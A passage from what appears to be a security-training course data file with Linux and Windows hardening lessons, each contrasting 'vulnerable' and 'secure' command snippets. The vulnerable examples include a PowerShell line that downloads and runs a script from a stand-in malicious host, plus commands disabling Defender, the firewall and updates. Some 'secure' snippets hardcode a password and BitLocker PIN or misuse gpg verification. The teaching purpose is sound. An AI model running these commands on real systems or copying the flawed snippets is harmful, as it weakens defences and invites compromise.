auditctl -w /etc/shadow -p wa -k shadow_changes`,
              explanation: "Comprehensive log monitoring includes centralized logging, automated analysis, and alerting."
            },
            prevention: [
              "Configure centralized logging",
              "Implement automated log analysis",
              "Set up real-time alerting for security events",
              "Regular log review and forensic analysis"
            ]
          }
        },
        {
          id: "process-monitoring",
          title: "Process and Service Monitoring",
          type: "practical",
          content: {
            theory: "Monitoring running processes and services helps detect malicious activity and system compromises.",
            vulnerability: {
              code: `# VULNERABLE - No process monitoring
# Running unnecessary services
systemctl status telnet
systemctl status ftp
systemctl status rsh
# No monitoring of process behavior
ps aux | grep suspicious  # Manual check only`,
              explanation: "Without process monitoring, malicious processes can run undetected on the system."
            },
            secure: {
              code: `# SECURE - Comprehensive process monitoring
# Disable unnecessary services
systemctl disable telnet ftp rsh
systemctl mask telnet ftp rsh

# Install and configure process monitoring
# Using osquery for process monitoring
SELECT pid, name, path, cmdline FROM processes 
WHERE name LIKE '%suspicious%' OR cmdline LIKE '%malicious%';

# Set up process baseline monitoring
# /etc/aide.conf - Advanced Intrusion Detection Environment
/usr/bin f+p+u+g+s+m+c+md5
/usr/sbin f+p+u+g+s+m+c+md5
/bin f+p+u+g+s+m+c+md5`,
              explanation: "Systematic process monitoring includes service hardening, behavioral analysis, and integrity checking."
            },
            prevention: [
              "Disable unnecessary services and processes",
              "Implement process whitelisting",
              "Monitor process behavior and resource usage",
              "Use integrity monitoring tools (AIDE, OSSEC)"
            ]
          }
        },
        {
          id: "kernel-security",
          title: "Kernel Security and Hardening",
          type: "practical",
          content: {
            theory: "Kernel hardening involves configuring kernel parameters and security modules to enhance system security.",
            vulnerability: {
              code: `# VULNERABLE - Default kernel configuration
# /etc/sysctl.conf - Default settings
net.ipv4.ip_forward = 1
net.ipv4.conf.all.send_redirects = 1
net.ipv4.conf.all.accept_redirects = 1
net.ipv4.conf.all.accept_source_route = 1
kernel.dmesg_restrict = 0`,
              explanation: "Default kernel settings may enable unnecessary features that increase attack surface."
            },
            secure: {
              code: `# SECURE - Hardened kernel configuration
# /etc/sysctl.conf - Security hardening
net.ipv4.ip_forward = 0
net.ipv4.conf.all.send_redirects = 0
net.ipv4.conf.all.accept_redirects = 0
net.ipv4.conf.all.accept_source_route = 0
net.ipv4.conf.all.log_martians = 1
net.ipv4.icmp_echo_ignore_broadcasts = 1
kernel.dmesg_restrict = 1
kernel.kptr_restrict = 2
kernel.yama.ptrace_scope = 1
fs.suid_dumpable = 0`,
              explanation: "Hardened kernel parameters disable unnecessary features and enable security protections."
            },
            prevention: [
              "Disable IP forwarding if not needed",
              "Enable kernel address space layout randomization",
              "Configure ptrace restrictions",
              "Regular kernel updates and security patches"
            ]
          }
        },
        {
          id: "filesystem-security",
          title: "Filesystem Security and Encryption",
          type: "practical",
          content: {
            theory: "Filesystem security involves proper mounting options, encryption, and access controls to protect data at rest.",
            vulnerability: {
              code: `# VULNERABLE - Insecure filesystem mounting
# /etc/fstab - Weak mounting options
/dev/sda1 / ext4 defaults 0 1
/dev/sda2 /home ext4 defaults 0 1
/dev/sda3 /tmp ext4 defaults 0 1
# No encryption for sensitive data`,
              explanation: "Default mount options and unencrypted filesystems leave data vulnerable to unauthorized access."
            },
            secure: {
              code: `# SECURE - Hardened filesystem configuration
# /etc/fstab - Security-focused mounting
/dev/sda1 / ext4 defaults,nodev 0 1
/dev/sda2 /home ext4 defaults,nodev,nosuid 0 1
/dev/sda3 /tmp ext4 defaults,nodev,nosuid,noexec 0 1
/dev/sda4 /var ext4 defaults,nodev 0 1
tmpfs /dev/shm tmpfs defaults,nodev,nosuid,noexec 0 0

# Setup LUKS encryption for sensitive partitions
cryptsetup luksFormat /dev/sda5
cryptsetup luksOpen /dev/sda5 encrypted_data
mkfs.ext4 /dev/mapper/encrypted_data`,
              explanation: "Secure mounting options and encryption protect against various attack vectors and data theft."
            },
            prevention: [
              "Use appropriate mount options (nodev, nosuid, noexec)",
              "Implement full disk encryption with LUKS",
              "Regular filesystem integrity checks",
              "Secure backup and recovery procedures"
            ]
          }
        },
        {
          id: "network-configuration",
          title: "Network Interface Security",
          type: "practical",
          content: {
            theory: "Network interface configuration affects system exposure and network-based attack vectors.",
            vulnerability: {
              code: `# VULNERABLE - Insecure network configuration
# Listening on all interfaces
netstat -tulpn | grep 0.0.0.0
# Unnecessary network services enabled
systemctl status cups
systemctl status avahi-daemon
# No network monitoring
tcpdump -i any  # Only manual monitoring`,
              explanation: "Insecure network configuration exposes services unnecessarily and lacks proper monitoring."
            },
            secure: {
              code: `# SECURE - Hardened network configuration
# Bind services to specific interfaces only
# /etc/ssh/sshd_config
ListenAddress 192.168.1.100

# Disable unnecessary network services
systemctl disable cups avahi-daemon
systemctl mask cups avahi-daemon

# Configure network monitoring
# Install and configure iptables logging
iptables -A INPUT -j LOG --log-prefix "IPTABLES-DROPPED: "
# Setup network intrusion detection
suricata -c /etc/suricata/suricata.yaml -i eth0`,
              explanation: "Secure network configuration limits service exposure and implements comprehensive monitoring."
            },
            prevention: [
              "Bind services to specific interfaces only",
              "Disable unnecessary network services",
              "Implement network intrusion detection",
              "Regular network security audits"
            ]
          }
        },
        {
          id: "backup-security",
          title: "Secure Backup and Recovery",
          type: "practical",
          content: {
            theory: "Secure backup strategies ensure data integrity and availability while protecting against various threats.",
            vulnerability: {
              code: `# VULNERABLE - Insecure backup practices
# Unencrypted backups
tar -czf backup.tar.gz /home/user/
cp backup.tar.gz /mnt/usb/  # Unencrypted storage
# No integrity verification
# Backups stored in same location as original data`,
              explanation: "Insecure backup practices can lead to data loss and exposure of sensitive information."
            },
            secure: {
              code: `# SECURE - Encrypted backup strategy
# Create encrypted backup with GPG
tar -czf - /home/user/ | gpg --cipher-algo AES256 --compress-algo 1 \\
  --symmetric --output backup_$(date +%Y%m%d).tar.gz.gpg

# Verify backup integrity
sha256sum backup_*.tar.gz.gpg > backup_checksums.txt
gpg --verify backup_checksums.txt

# Automated secure backup script
#!/bin/bash
BACKUP_DIR="/secure/backups"
DATE=$(date +%Y%m%d_%H%M%S)
tar -czf - /important/data | gpg --batch --yes --passphrase-file /secure/.passphrase \\
  --cipher-algo AES256 --symmetric --output "$BACKUP_DIR/backup_$DATE.tar.gz.gpg"`,
              explanation: "Secure backups use encryption, integrity verification, and proper storage separation."
            },
            prevention: [
              "Encrypt all backup data",
              "Implement automated backup verification",
              "Store backups in separate locations",
              "Regular backup and restore testing"
            ]
          }
        },
        {
          id: "incident-response",
          title: "Incident Response and Forensics",
          type: "practical",
          content: {
            theory: "Incident response procedures and forensic capabilities are crucial for handling security breaches effectively.",
            vulnerability: {
              code: `# VULNERABLE - No incident response plan
# No forensic tools installed
# No log preservation procedures
# Manual response only
find /var/log -name "*.log" -exec cat {} \\; | grep suspicious
# No evidence preservation`,
              explanation: "Lack of proper incident response procedures can lead to evidence loss and prolonged compromise."
            },
            secure: {
              code: `# SECURE - Comprehensive incident response setup
# Install forensic tools
apt-get install sleuthkit autopsy volatility-tools

# Setup log preservation
# /etc/rsyslog.conf - Long-term log retention
$WorkDirectory /var/spool/rsyslog
$ActionQueueFileName fwdRule1
$ActionQueueMaxDiskSpace 10g
$ActionResumeRetryCount -1

# Create incident response script
#!/bin/bash
# /usr/local/bin/incident_response.sh
INCIDENT_DIR="/forensics/incident_$(date +%Y%m%d_%H%M%S)"
mkdir -p "$INCIDENT_DIR"

# Collect system information
ps aux > "$INCIDENT_DIR/processes.txt"
netstat -tulpn > "$INCIDENT_DIR/network.txt"
lsof > "$INCIDENT_DIR/open_files.txt"
last -f /var/log/wtmp > "$INCIDENT_DIR/login_history.txt"

# Create memory dump
dd if=/dev/mem of="$INCIDENT_DIR/memory_dump.raw" bs=1M`,
              explanation: "Proper incident response includes forensic tools, evidence preservation, and automated collection procedures."
            },
            prevention: [
              "Develop and test incident response procedures",
              "Install and maintain forensic tools",
              "Implement automated evidence collection",
              "Regular incident response training and drills"
            ]
          }
        }
      ]
    },
    "windows-security": {
      title: "Windows Security Essentials",
      description: "Core security concepts for Windows environments",
      progress: 0,
      totalLessons: 22,
      sections: [
        {
          id: "user-account-control",
          title: "User Account Control (UAC)",
          type: "theory",
          content: {
            theory: "UAC is a security feature that helps prevent unauthorized changes to the system by requiring elevation for administrative tasks.",
            keyPoints: [
              "Reduces attack surface by running with standard user privileges",
              "Prompts for elevation when administrative access is needed",
              "Can be configured through Group Policy",
              "Essential for defense in depth strategy"
            ]
          }
        },
        {
          id: "powershell-execution-policy",
          title: "PowerShell Execution Policy and Security",
          type: "practical",
          content: {
            theory: "PowerShell Execution Policy is a security feature that controls the conditions under which PowerShell loads configuration files and runs scripts. It helps prevent the execution of malicious scripts while allowing legitimate administrative tasks. Understanding and properly configuring execution policies is crucial for Windows security, as PowerShell is a powerful administrative tool that can be exploited by attackers if not properly secured.",
            vulnerability: {
              code: `# VULNERABLE - Unrestricted execution policy allows any script to run
# Check current execution policy
Get-ExecutionPolicy

# Setting dangerous unrestricted policy
Set-ExecutionPolicy Unrestricted -Force

# This allows ANY script to execute without warnings
# Including potentially malicious downloaded scripts
Invoke-WebRequest -Uri "http://malicious-site.com/script.ps1" -OutFile "script.ps1"
.\\script.ps1  # This would run without any security checks`,
              explanation: "Unrestricted execution policy removes all safety mechanisms, allowing any PowerShell script to execute automatically. This creates a significant security vulnerability as malicious scripts can run without user awareness or consent."
            },
            secure: {
              code: `# SECURE - Proper PowerShell security configuration
# Set restrictive execution policy for current user
Set-ExecutionPolicy -ExecutionPolicy RemoteSigned -Scope CurrentUser

# For enterprise environments, use Group Policy to enforce
# Computer Configuration > Policies > Administrative Templates > 
# Windows Components > Windows PowerShell > Turn on Script Execution

# Check and verify current policy
Get-ExecutionPolicy -List

# Sign trusted scripts with code signing certificate
Set-AuthenticodeSignature -FilePath "trusted-script.ps1" -Certificate $cert

# Enable PowerShell logging for monitoring
# Enable Module Logging and Script Block Logging via Group Policy
Get-WinEvent -FilterHashtable @{LogName='Microsoft-Windows-PowerShell/Operational'}`,
              explanation: "RemoteSigned policy ensures that locally created scripts can run while requiring downloaded scripts to be signed by a trusted publisher. Combined with logging, this provides a balanced approach between security and functionality."
            },
            prevention: [
              "Use RemoteSigned or AllSigned execution policy in production",
              "Enable PowerShell script block logging and transcription",
              "Implement code signing for internal scripts",
              "Regular monitoring of PowerShell execution logs",
              "Use Constrained Language Mode for restricted environments"
            ]
          }
        },
        {
          id: "windows-firewall-advanced",
          title: "Windows Defender Firewall with Advanced Security",
          type: "practical",
          content: {
            theory: "Windows Defender Firewall with Advanced Security is a host-based firewall that provides network traffic filtering for Windows systems. It operates at the network layer and can control both inbound and outbound traffic based on various criteria including source/destination addresses, ports, protocols, and applications. Understanding advanced firewall configuration is essential for network security and compliance requirements.",
            vulnerability: {
              code: `# VULNERABLE - Firewall disabled or misconfigured
# Check if firewall is disabled (dangerous)
Get-NetFirewallProfile | Select-Object Name, Enabled

# Disabling firewall (NEVER do this in production)
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled False

# Overly permissive rules
New-NetFirewallRule -DisplayName "Allow All" -Direction Inbound -Action Allow

# No logging enabled for monitoring
Get-NetFirewallProfile | Select-Object Name, LogBlocked, LogAllowed`,
              explanation: "Disabling Windows Firewall or creating overly permissive rules removes critical network protection. Without proper logging, security incidents cannot be detected or investigated effectively."
            },
            secure: {
              code: `# SECURE - Properly configured Windows Firewall
# Enable firewall for all profiles
Set-NetFirewallProfile -Profile Domain,Public,Private -Enabled True

# Configure default actions (block inbound, allow outbound)
Set-NetFirewallProfile -Profile Domain,Public,Private -DefaultInboundAction Block
Set-NetFirewallProfile -Profile Domain,Public,Private -DefaultOutboundAction Allow

# Create specific rules for required services
New-NetFirewallRule -DisplayName "Allow RDP" -Direction Inbound -Protocol TCP -LocalPort 3389 -Action Allow -Profile Domain

# Enable comprehensive logging
Set-NetFirewallProfile -Profile Domain,Public,Private -LogBlocked True -LogAllowed True
Set-NetFirewallProfile -Profile Domain,Public,Private -LogFileName "C:\\Windows\\System32\\LogFiles\\Firewall\\pfirewall.log"

# Review and audit firewall rules regularly
Get-NetFirewallRule | Where-Object {$_.Enabled -eq "True"} | Select-Object DisplayName, Direction, Action`,
              explanation: "Proper firewall configuration uses default-deny policies with specific allow rules for required services. Comprehensive logging enables security monitoring and incident response."
            },
            prevention: [
              "Maintain default-deny inbound policy with specific exceptions",
              "Enable firewall logging for all profiles",
              "Regular audit of firewall rules and remove unused rules",
              "Use Group Policy for centralized firewall management",
              "Monitor firewall logs for suspicious activity"
            ]
          }
        },
        {
          id: "local-security-policy",
          title: "Local Security Policy Configuration",
          type: "practical",
          content: {
            theory: "Local Security Policy (secpol.msc) is a Microsoft Windows administrative tool that allows administrators to configure security settings for local computers. These policies control user rights, security options, password policies, account lockout policies, and audit policies. Proper configuration of local security policies is fundamental for maintaining system security and compliance with organizational security standards.",
            vulnerability: {
              code: `# VULNERABLE - Weak security policy settings
# Check current password policy (showing weak settings)
net accounts

# Example output showing weak policies:
# Minimum password length: 0
# Maximum password age: 42 days
# Account lockout threshold: Never
# Account lockout duration: 30 minutes

# Checking user rights assignments (showing excessive privileges)
whoami /priv

# Audit policy showing no auditing
auditpol /get /category:*`,
              explanation: "Weak password policies, excessive user privileges, and disabled auditing create multiple security vulnerabilities. Systems with no password requirements and no audit logging are particularly vulnerable to attack."
            },
            secure: {
              code: `# SECURE - Hardened local security policy configuration
# Configure strong password policy via command line
net accounts /minpwlen:12 /maxpwage:60 /minpwage:1 /uniquepw:12

# Set account lockout policy
net accounts /lockoutthreshold:5 /lockoutduration:30 /lockoutwindow:30

# Configure audit policy for comprehensive logging
auditpol /set /subcategory:"Logon" /success:enable /failure:enable
auditpol /set /subcategory:"Account Logon" /success:enable /failure:enable
auditpol /set /subcategory:"Process Creation" /success:enable
auditpol /set /subcategory:"Privilege Use" /success:enable /failure:enable

# Review and restrict user rights assignments
# Use secpol.msc GUI for detailed user rights management

# Enable additional security options via registry
reg add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v "RestrictAnonymous" /t REG_DWORD /d 1 /f
reg add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v "NoLMHash" /t REG_DWORD /d 1 /f`,
              explanation: "Strong password policies, proper account lockout settings, comprehensive auditing, and restrictive user rights assignments create multiple layers of security protection."
            },
            prevention: [
              "Enforce minimum 12-character password length",
              "Implement account lockout after 5 failed attempts",
              "Enable comprehensive audit logging for security events",
              "Regular review and restriction of user rights assignments",
              "Use Group Policy for enterprise-wide policy enforcement"
            ]
          }
        },
        {
          id: "windows-event-logs",
          title: "Windows Event Log Management and Security Monitoring",
          type: "practical",
          content: {
            theory: "Windows Event Logs are a centralized logging system that records system, security, and application events. Security professionals use these logs for incident detection, forensic analysis, and compliance monitoring. Understanding how to configure, manage, and analyze Windows Event Logs is crucial for maintaining situational awareness and detecting security incidents in Windows environments.",
            vulnerability: {
              code: `# VULNERABLE - Default logging configuration with limited retention
# Check default event log settings (typically small size and overwrite)
Get-WinEvent -ListLog * | Where-Object {$_.LogName -like "*Security*"} | Select-Object LogName, MaximumSizeInBytes, LogMode

# Default settings often show:
# MaximumSizeInBytes: 20971520 (20MB)
# LogMode: Circular (overwrites old events)

# No centralized log collection
# No security event monitoring or alerting
# Minimal audit policy enabled by default`,
              explanation: "Default event log settings provide insufficient storage and retention for security monitoring. Small log sizes and circular logging modes result in loss of critical security events needed for incident response and forensic analysis."
            },
            secure: {
              code: `# SECURE - Enhanced event log configuration for security monitoring
# Increase Security log size and set to Archive mode
wevtutil sl Security /ms:1073741824  # 1GB size
wevtutil sl Security /rt:false       # Disable overwrite (archive mode)

# Configure System and Application logs similarly
wevtutil sl System /ms:536870912     # 512MB
wevtutil sl Application /ms:536870912

# Enable PowerShell logging
reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ModuleLogging" /v "EnableModuleLogging" /t REG_DWORD /d 1 /f
reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\PowerShell\\ScriptBlockLogging" /v "EnableScriptBlockLogging" /t REG_DWORD /d 1 /f

# Query security events for monitoring
# Failed logon attempts (Event ID 4625)
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4625; StartTime=(Get-Date).AddDays(-1)}

# Successful privileged logons (Event ID 4624 with LogonType 10)
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4624} | Where-Object {$_.Message -like "*Logon Type:*10*"}

# Process creation events (Event ID 4688)
Get-WinEvent -FilterHashtable @{LogName='Security'; ID=4688; StartTime=(Get-Date).AddHours(-24)}`,
              explanation: "Enhanced logging configuration provides sufficient storage and retention for security analysis. Comprehensive event monitoring enables detection of suspicious activities and supports forensic investigations."
            },
            prevention: [
              "Configure log files with adequate size (minimum 1GB for Security log)",
              "Use Archive mode instead of Circular to preserve historical events",
              "Enable advanced auditing for process creation and privilege use",
              "Implement centralized log collection with SIEM integration",
              "Regular monitoring and analysis of security-relevant event IDs"
            ]
          }
        },
        {
          id: "registry-security-hardening",
          title: "Windows Registry Security and Hardening",
          type: "practical",
          content: {
            theory: "The Windows Registry is a hierarchical database that stores configuration settings for the operating system and applications. It contains critical security settings that control system behavior, user privileges, and security policies. Proper registry hardening involves configuring security-related registry keys to enhance system protection while understanding the risks of registry modifications and maintaining system stability.",
            vulnerability: {
              code: `# VULNERABLE - Default registry settings with security weaknesses
# Check for anonymous access permissions (security risk)
reg query "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v "RestrictAnonymous"

# Default: RestrictAnonymous = 0 (allows anonymous connections)

# LM Hash storage enabled (weak authentication)
reg query "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v "NoLMHash"

# SMB1 protocol enabled (vulnerable to attacks)
reg query "HKLM\\System\\CurrentControlSet\\Services\\LanmanServer\\Parameters" /v "SMB1"

# No UAC for built-in Administrator account
reg query "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "FilterAdministratorToken"`,
              explanation: "Default registry settings often prioritize compatibility over security. Anonymous access, weak authentication protocols, and legacy features create potential attack vectors that should be addressed through proper registry hardening."
            },
            secure: {
              code: `# SECURE - Registry hardening for enhanced security
# Restrict anonymous access to system information
reg add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v "RestrictAnonymous" /t REG_DWORD /d 1 /f
reg add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v "RestrictAnonymousSAM" /t REG_DWORD /d 1 /f

# Disable LM Hash storage (force stronger authentication)
reg add "HKLM\\System\\CurrentControlSet\\Control\\Lsa" /v "NoLMHash" /t REG_DWORD /d 1 /f

# Disable SMB1 protocol (prevent SMB1-based attacks)
reg add "HKLM\\System\\CurrentControlSet\\Services\\LanmanServer\\Parameters" /v "SMB1" /t REG_DWORD /d 0 /f

# Enable UAC for built-in Administrator account
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\System" /v "FilterAdministratorToken" /t REG_DWORD /d 1 /f

# Disable AutoRun for all drives (prevent malware execution)
reg add "HKLM\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Policies\\Explorer" /v "NoDriveTypeAutoRun" /t REG_DWORD /d 255 /f

# Create registry backup before making changes
reg export HKLM\\System\\CurrentControlSet\\Control\\Lsa lsa_backup.reg`,
              explanation: "Comprehensive registry hardening addresses multiple attack vectors including anonymous access, weak authentication, legacy protocols, and autorun vulnerabilities while maintaining system functionality."
            },
            prevention: [
              "Always create registry backups before making security changes",
              "Test registry modifications in non-production environments first",
              "Use Group Policy for enterprise-wide registry security settings",
              "Regular audit of security-related registry keys",
              "Document all registry changes for compliance and troubleshooting"
            ]
          }
        },
        {
          id: "windows-defender-configuration",
          title: "Windows Defender Antivirus Advanced Configuration",
          type: "practical",
          content: {
            theory: "Windows Defender Antivirus is Microsoft's built-in endpoint protection platform that provides real-time protection against malware, viruses, and other threats. Advanced configuration involves optimizing scan settings, exclusions management, cloud protection features, and integration with enterprise security tools. Understanding these configurations is essential for maintaining effective endpoint protection while minimizing performance impact on business operations.",
            vulnerability: {
              code: `# VULNERABLE - Windows Defender disabled or poorly configured
# Check if Windows Defender is disabled
Get-MpComputerStatus | Select-Object AntivirusEnabled, RealTimeProtectionEnabled

# Common misconfigurations:
# Real-time protection disabled
Set-MpPreference -DisableRealtimeMonitoring $true

# Cloud protection disabled (reduces detection capabilities)
Set-MpPreference -MAPSReporting Disabled
Set-MpPreference -SubmitSamplesConsent NeverSend

# Excessive exclusions (creates security gaps)
Add-MpPreference -ExclusionPath "C:\\"
Add-MpPreference -ExclusionExtension ".exe"`,
              explanation: "Disabling Windows Defender or misconfiguring its settings significantly reduces endpoint protection. Excessive exclusions and disabled cloud protection create security gaps that malware can exploit."
            },
            secure: {
              code: `# SECURE - Optimized Windows Defender configuration
# Enable all protection features
Set-MpPreference -DisableRealtimeMonitoring $false
Set-MpPreference -DisableBehaviorMonitoring $false
Set-MpPreference -DisableIOAVProtection $false
Set-MpPreference -DisableScriptScanning $false

# Configure cloud protection for enhanced detection
Set-MpPreference -MAPSReporting Advanced
Set-MpPreference -SubmitSamplesConsent SendSafeSamples

# Configure scan settings
Set-MpPreference -ScanAvgCPULoadFactor 50
Set-MpPreference -ScanOnlyIfIdleEnabled $true

# Set up scheduled scans
$trigger = New-ScheduledTaskTrigger -Weekly -WeeksInterval 1 -DaysOfWeek Sunday -At 2AM
$action = New-ScheduledTaskAction -Execute "MpCmdRun.exe" -Argument "-Scan -ScanType 2"
Register-ScheduledTask -TaskName "Weekly Full Scan" -Trigger $trigger -Action $action

# Monitor threat detection
Get-MpThreatDetection | Select-Object ThreatID, ThreatName, ActionTaken, InitialDetectionTime

# Configure specific exclusions only when necessary (minimize)
Add-MpPreference -ExclusionPath "C:\\TrustedApp\\logs"  # Only specific paths
Add-MpPreference -ExclusionProcess "trustedapp.exe"    # Only specific processes`,
              explanation: "Properly configured Windows Defender provides comprehensive protection with cloud-enhanced detection, appropriate scanning schedules, and minimal necessary exclusions."
            },
            prevention: [
              "Maintain real-time protection and behavior monitoring enabled",
              "Enable cloud protection for advanced threat intelligence",
              "Implement minimal and specific exclusions only when required",
              "Regular review and removal of unnecessary exclusions",
              "Monitor threat detection logs and respond to alerts promptly"
            ]
          }
        },
        {
          id: "service-hardening-windows",
          title: "Windows Service Security and Hardening",
          type: "practical",
          content: {
            theory: "Windows Services are background processes that run independently of user sessions and provide essential system functionality. Service hardening involves identifying unnecessary services, configuring appropriate service accounts, setting proper permissions, and monitoring service behavior. Attackers often target services for privilege escalation, persistence, and lateral movement, making service security a critical component of Windows hardening.",
            vulnerability: {
              code: `# VULNERABLE - Services running with excessive privileges
# Check services running as SYSTEM (potential security risk)
Get-WmiObject -Class Win32_Service | Where-Object {$_.StartName -eq "LocalSystem"} | Select-Object Name, State, StartName

# Unnecessary services enabled (increasing attack surface)
Get-Service | Where-Object {$_.Status -eq "Running" -and $_.Name -like "*Telnet*"}
Get-Service | Where-Object {$_.Status -eq "Running" -and $_.Name -like "*FTP*"}

# Services with weak permissions
# Example: Service allows modification by non-administrative users
sc sdshow "VulnerableService"

# No monitoring of service changes
# Services can be modified without detection`,
              explanation: "Services running with excessive privileges, unnecessary services, and weak service permissions create attack vectors. Attackers can exploit these vulnerabilities for privilege escalation and system compromise."
            },
            secure: {
              code: `# SECURE - Comprehensive service hardening approach
# Identify and disable unnecessary services
$unnecessaryServices = @("Telnet", "FTPSVC", "SNMPTRAP", "RemoteRegistry")
foreach ($service in $unnecessaryServices) {
    if (Get-Service -Name $service -ErrorAction SilentlyContinue) {
        Stop-Service -Name $service -Force
        Set-Service -Name $service -StartupType Disabled
        Write-Host "Disabled service: $service"
    }
}

# Configure services to run with minimal required privileges
# Example: Configure a service to run as Network Service instead of Local System
sc config "ServiceName" obj= "NT AUTHORITY\\NetworkService"

# Create dedicated service accounts for critical services
$serviceAccount = "ServiceAccount"
$password = ConvertTo-SecureString "ComplexP@ssw0rd123!" -AsPlainText -Force
New-LocalUser -Name $serviceAccount -Password $password -Description "Dedicated service account"

# Grant minimal required rights to service account
$userRight = "SeServiceLogonRight"
$userName = $serviceAccount
Grant-UserRight -Account $userName -Right $userRight

# Monitor service changes with Event Log
auditpol /set /subcategory:"Security System Extension" /success:enable /failure:enable

# Regular service audit
Get-Service | Where-Object {$_.Status -eq "Running"} | 
    Select-Object Name, StartType, @{Name="Account";Expression={(Get-WmiObject -Class Win32_Service -Filter "Name='$($_.Name)'").StartName}} |
    Export-Csv -Path "C:\\Temp\\RunningServices.csv" -NoTypeInformation`,
              explanation: "Comprehensive service hardening includes disabling unnecessary services, using dedicated service accounts with minimal privileges, and implementing monitoring for service changes."
            },
            prevention: [
              "Regular audit of running services and disable unnecessary ones",
              "Use dedicated service accounts instead of built-in high-privilege accounts",
              "Implement principle of least privilege for service permissions",
              "Monitor service configuration changes through Event Logs",
              "Establish service baseline and alert on unauthorized modifications"
            ]
          }
        },
        {
          id: "bitlocker-drive-encryption",
          title: "BitLocker Drive Encryption Implementation",
          type: "practical",
          content: {
            theory: "BitLocker Drive Encryption is Microsoft's full disk encryption feature that protects data by encrypting entire volumes and requiring authentication before the operating system boots or the volume is accessed. BitLocker helps protect against data theft or exposure from lost, stolen, or inappropriately decommissioned devices. Understanding proper BitLocker implementation, key management, and recovery procedures is essential for data protection in enterprise environments.",
            vulnerability: {
              code: `# VULNERABLE - Unencrypted drives and poor BitLocker configuration
# Check if BitLocker is enabled (showing unprotected drives)
Get-BitLockerVolume

# Example output showing unprotected drives:
# VolumeType: OperatingSystem, EncryptionPercentage: 0, VolumeStatus: FullyDecrypted

# BitLocker enabled but with weak authentication
# TPM-only protection (vulnerable to physical attacks)
Enable-BitLocker -MountPoint "C:" -TpmProtector

# No backup of recovery keys
# Recovery key stored locally only (single point of failure)

# BitLocker suspended or disabled
Suspend-BitLocker -MountPoint "C:" -RebootCount 0`,
              explanation: "Unencrypted drives expose data to theft if devices are lost or stolen. Weak BitLocker configurations with TPM-only protection and no recovery key backup create security and availability risks."
            },
            secure: {
              code: `# SECURE - Comprehensive BitLocker deployment with strong security
# Check TPM status and prepare for BitLocker
Get-Tpm
Initialize-Tpm

# Enable BitLocker with PIN + TPM for enhanced security
$Pin = ConvertTo-SecureString "1234567890" -AsPlainText -Force
Enable-BitLocker -MountPoint "C:" -TpmAndPinProtector -Pin $Pin

# Backup recovery key to Active Directory (enterprise environment)
Enable-BitLocker -MountPoint "C:" -RecoveryPasswordProtector
$RecoveryKey = (Get-BitLockerVolume -MountPoint "C:").KeyProtector | Where-Object {$_.KeyProtectorType -eq "RecoveryPassword"}
Backup-BitLockerKeyProtector -MountPoint "C:" -KeyProtectorId $RecoveryKey.KeyProtectorId

# Export recovery key to secure location
$RecoveryPassword = (Get-BitLockerVolume -MountPoint "C:").KeyProtector | Where-Object {$_.KeyProtectorType -eq "RecoveryPassword"}
$RecoveryPassword.RecoveryPassword | Out-File -FilePath "C:\\SecureLocation\\BitLocker-Recovery.txt"

# Configure BitLocker Group Policy settings
# Computer Configuration > Policies > Administrative Templates > Windows Components > BitLocker Drive Encryption

# Monitor BitLocker status
Get-BitLockerVolume | Select-Object MountPoint, VolumeType, EncryptionPercentage, VolumeStatus, ProtectionStatus

# Set up automated BitLocker monitoring
$scriptBlock = {
    $volumes = Get-BitLockerVolume
    foreach ($volume in $volumes) {
        if ($volume.ProtectionStatus -ne "On") {
            Write-EventLog -LogName Application -Source "BitLocker Monitor" -EventId 1001 -EntryType Warning -Message "BitLocker protection disabled on $($volume.MountPoint)"
        }
    }
}
Register-ScheduledJob -Name "BitLocker Monitor" -ScriptBlock $scriptBlock -Trigger (New-JobTrigger -Daily -At 9AM)`,
              explanation: "Secure BitLocker implementation uses multi-factor authentication (TPM + PIN), proper recovery key management with backups, and continuous monitoring of encryption status."
            },
            prevention: [
              "Enable BitLocker on all drives containing sensitive data",
              "Use multi-factor authentication (TPM + PIN or TPM + USB key)",
              "Implement centralized recovery key backup to Active Directory",
              "Regular monitoring of BitLocker status and protection state",
              "Establish BitLocker policies through Group Policy for consistency"
            ]
          }
        },
        {
          id: "windows-update-security",
          title: "Windows Update Security Management",
          type: "practical",
          content: {
            theory: "Windows Update is the mechanism through which Microsoft delivers security patches, feature updates, and other improvements to Windows systems. Proper update management is critical for maintaining system security, as many cyberattacks exploit known vulnerabilities that have available patches. Understanding Windows Update configuration, testing procedures, and deployment strategies helps organizations maintain security while ensuring system stability and business continuity.",
            vulnerability: {
              code: `# VULNERABLE - Automatic updates disabled or poorly managed
# Check Windows Update service status (should be running)
Get-Service -Name wuauserv | Select-Object Name, Status, StartType

# Windows Update disabled
Set-Service -Name wuauserv -StartupType Disabled
Stop-Service -Name wuauserv -Force

# No update policy configured
Get-ItemProperty -Path "HKLM:\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU" -ErrorAction SilentlyContinue

# Check for pending updates (showing many critical updates)
Get-WUList | Where-Object {$_.Title -like "*Security*"}

# No testing environment for updates
# Updates applied directly to production systems`,
              explanation: "Disabled Windows Updates leave systems vulnerable to known exploits. Lack of update management policies and testing procedures can lead to security gaps or system instability."
            },
            secure: {
              code: `# SECURE - Comprehensive Windows Update management strategy
# Ensure Windows Update service is configured properly
Set-Service -Name wuauserv -StartupType Automatic
Start-Service -Name wuauserv

# Configure Windows Update policy via registry (for domain environments, use Group Policy)
reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU" /v "AUOptions" /t REG_DWORD /d 3 /f
reg add "HKLM\\SOFTWARE\\Policies\\Microsoft\\Windows\\WindowsUpdate\\AU" /v "ScheduledInstallDay" /t REG_DWORD /d 1 /f
